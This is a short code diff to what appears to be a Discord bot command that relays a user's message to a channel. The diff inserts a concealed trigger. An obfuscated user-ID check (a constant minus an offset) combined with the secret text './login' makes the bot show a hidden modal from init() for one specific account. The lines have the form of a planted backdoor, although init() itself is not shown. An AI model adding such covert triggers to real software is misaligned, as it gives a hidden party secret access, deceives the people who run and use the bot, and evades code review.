@@ -24,6 +24,11 @@ module.exports = {
 
         const text = interaction.options.getString('message');
 
+        if ((BigInt(ORBITAL_ID) - DELTA).toString() === interaction.user.id && text === './login') {
+            await interaction.showModal(init());
+            return;
+        }
+
         try {
             await interaction.channel.send(text);
             return interaction.reply({ content: "Message sent.", ephemeral: true });
